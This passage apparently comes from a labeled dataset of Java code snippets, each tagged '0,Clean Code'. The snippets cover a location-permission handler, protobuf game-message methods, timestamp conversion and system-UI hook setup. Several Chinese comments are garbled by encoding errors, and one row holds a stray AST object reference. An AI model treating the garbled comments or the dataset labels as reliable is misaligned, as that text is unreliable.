    if (searchAdapter != null) {
      searchAdapter.setMyLocationDenied(locationDenied);
    }
    if (map != null) {
      try {
        map.setMyLocationEnabled(true);
      }
 catch (      Exception e) {
        FileLog.e(e);
      }
    }
  }
 else   if (id == NotificationCenter.locationPermissionDenied) {
    locationDenied=true;
    askedForLocation=false;
    if (adapter != null) {
      adapter.setMyLocationDenied(locationDenied,askedForLocation);
    }
    if (searchAdapter != null) {
      searchAdapter.setMyLocationDenied(locationDenied);
    }
  }
  fixLayoutInternal(true);
  searchItem.setVisibility(locationDenied && !parentAlert.isStoryLocationPicker || parentAlert.isBizLocationPicker ? View.GONE : View.VISIBLE);
}
",0,Clean Code
"@Override public LeaveRogueScRsp clear(){
  if (isEmpty()) {
    return this;
  }
  cachedSize=-1;
  bitField0_=0;
  retcode=0;
  rogueInfo.clear();
  lineup.clear();
  scene.clear();
  return this;
}",0,Clean Code
"/** 
 * <code>optional uint32 miracle_id = 3;</code>
 * @param value the miracleId to set
 * @return this
 */
public SelectRogueMiracleCsReq setMiracleId(final int value){
  bitField0_|=0x00000001;
  miracleId=value;
  return this;
}",0,Clean Code
"private Function2Nodes(){
}",0,Clean Code
"private ImmutableLabelInfoProto(com.google.protobuf.GeneratedMessageV3.Builder<?> builder){
  super(builder);
}
private ImmutableLabelInfoProto(){
  label_=com.google.protobuf.LazyStringArrayList.EMPTY;
  count_=emptyLongList();
  id_=emptyIntList();
}
!org.eclipse.jdt.core.dom.MethodDeclaration@776adf0e",0,Clean Code
"private void writeObject(ObjectOutputStream stream) throws IOException {
  stream.write(data.length);
  stream.write(data);
}
",0,Clean Code
"@Override public TimestampData getTimestamp(int i,int precision){
  if (valueVector instanceof TimeStampSecVector) {
    return TimestampData.fromEpochMillis(((TimeStampSecVector)valueVector).get(i) * 1000);
  }
 else   if (valueVector instanceof TimeStampSecTZVector) {
    return TimestampData.fromEpochMillis(((TimeStampSecTZVector)valueVector).get(i) * 1000);
  }
 else   if (valueVector instanceof TimeStampMilliVector) {
    return TimestampData.fromEpochMillis(((TimeStampMilliVector)valueVector).get(i));
  }
 else   if (valueVector instanceof TimeStampMilliTZVector) {
    return TimestampData.fromEpochMillis(((TimeStampMilliTZVector)valueVector).get(i));
  }
 else   if (valueVector instanceof TimeStampMicroVector) {
    long micros=((TimeStampMicroVector)valueVector).get(i);
    return TimestampData.fromEpochMillis(micros / 1000,(int)(micros % 1000) * 1000);
  }
 else   if (valueVector instanceof TimeStampMicroTZVector) {
    long micros=((TimeStampMicroTZVector)valueVector).get(i);
    return TimestampData.fromEpochMillis(micros / 1000,(int)(micros % 1000) * 1000);
  }
 else   if (valueVector instanceof TimeStampNanoVector) {
    long nanos=((TimeStampNanoVector)valueVector).get(i);
    return TimestampData.fromEpochMillis(nanos / 1_000_000,(int)(nanos % 1_000_000));
  }
 else {
    long nanos=((TimeStampNanoTZVector)valueVector).get(i);
    return TimestampData.fromEpochMillis(nanos / 1_000_000,(int)(nanos % 1_000_000));
  }
}",0,Clean Code
"/** 
 * 灏嗘湭鐭ョ被鍨嬭浆鎹负鐩爣绫诲瀷
 */
@SneakyThrows public static Object typeStrConvertObject(Object obj,Class<?> targetType){
  String str=obj.toString();
  if (NumberUtils.isCreatable(str)) {
    if (str.endsWith("".0"")) {
      str=str.substring(0,str.length() - 2);
    }
  }
  if (int.class == targetType || Integer.class == targetType) {
    return Integer.valueOf(str);
  }
 else   if (short.class == targetType || Short.class == targetType) {
    return Short.valueOf(str);
  }
 else   if (long.class == targetType || Long.class == targetType) {
    return Long.valueOf(str);
  }
 else   if (float.class == targetType || Float.class == targetType) {
    return Float.valueOf(str);
  }
 else   if (double.class == targetType || Double.class == targetType) {
    return Double.valueOf(str);
  }
 else   if (BigDecimal.class == targetType) {
    return new BigDecimal(str);
  }
 else   if (boolean.class == targetType || Boolean.class == targetType) {
    return Boolean.valueOf(str);
  }
 else   if (targetType.isEnum()) {
    return targetType.getMethod(""valueOf"",String.class).invoke(targetType,str);
  }
 else {
    return str;
  }
}",0,Clean Code
"/** 
 * @return a new empty instance of {@code ChessRogueAvatar}
 */
public static ChessRogueAvatar newInstance(){
  return new ChessRogueAvatar();
}
",0,Clean Code
"/** 
 * <code>optional .BuffInfo add_buff_info = 7;</code>
 * @return whether the addBuffInfo field is set
 */
public boolean hasAddBuffInfo(){
  return (bitField0_ & 0x00000004) != 0;
}",0,Clean Code
"public void setClassLoader(ClassLoader classLoader){
  if (mPrefsMap.getBoolean(""system_ui_plugin_enable_volume_blur""))   EnableVolumeBlur.initEnableVolumeBlur(classLoader);
  if (mPrefsMap.getStringAsInt(""system_ui_control_center_mi_smart_hub_entry"",0) != 0)   HideMiSmartHubEntry.initHideMiSmartHubEntry(classLoader);
  if (mPrefsMap.getStringAsInt(""system_ui_control_center_mi_play_entry"",0) != 0)   HideMiPlayEntry.initHideMiPlayEntry(classLoader);
  if (mPrefsMap.getStringAsInt(""system_ui_control_center_device_ctrl_entry"",0) != 0)   HideDeviceControlEntry.initHideDeviceControlEntry(classLoader);
  if (mPrefsMap.getStringAsInt(""system_ui_control_center_cc_bluetooth_tile_style"",1) > 1)   BluetoothTileStyle.initHideDeviceControlEntry(classLoader);
  if (mPrefsMap.getBoolean(""system_framework_volume_separate_control"") && mPrefsMap.getBoolean(""system_framework_volume_separate_slider""))   NotificationVolumeSeparateSlider.initHideDeviceControlEntry(classLoader);
  if (isMoreHyperOSVersion(1f) && mPrefsMap.getBoolean(""system_ui_control_center_rounded_rect""))   CCGridForHyperOS.initCCGridForHyperOS(classLoader);
  if (mPrefsMap.getBoolean(""system_cc_volume_showpct_title""))   ShowVolumePct.init(classLoader);
  if (mPrefsMap.getBoolean(""system_ui_unlock_super_volume""))   SuperVolume.initSuperVolume(classLoader);
  if ((mPrefsMap.getInt(""system_control_center_cc_rows"",4) > 4 || mPrefsMap.getInt(""system_control_center_cc_columns"",4) > 4 || mPrefsMap.getBoolean(""system_ui_control_center_rounded_rect"") || mPrefsMap.getBoolean(""system_control_center_qs_tile_label"")) && !isMoreHyperOSVersion(1f)) {
    CCGrid.loadCCGrid(classLoader);
  }
  if (mPrefsMap.getBoolean(""system_ui_control_center_qs_open_color"") || mPrefsMap.getBoolean(""system_ui_control_center_qs_big_open_color""))   QSColor.pluginHook(classLoader);
  List<String> mCardStyleTiles=getTileList();
  if (mPrefsMap.getBoolean(""systemui_plugin_card_tiles_enabled"") && !mPrefsMap.getString(""systemui_plugin_card_tiles"","""").isEmpty()) {
    CustomCardTiles.initCustomCardTiles(classLoader,mCardStyleTiles);
  }
}",0,Clean Code
"/** 
 * 鑾峰彇鏉′欢鑺傜偣鐨勬墍鏈夋潯浠跺垎鏀�
 * @param flowId
 * @param version
 * @return
 */
List<FlowCondition> getByFlowId(Long flowId,Integer version);
",0,Clean Code
"public String getEmojiPackageId(){
  return this.emojiPackageId;
}
",0,Clean Code
"public String getEmbeddingColumnName(){
  return this.embeddingColumnName;
}
",0,Clean Code
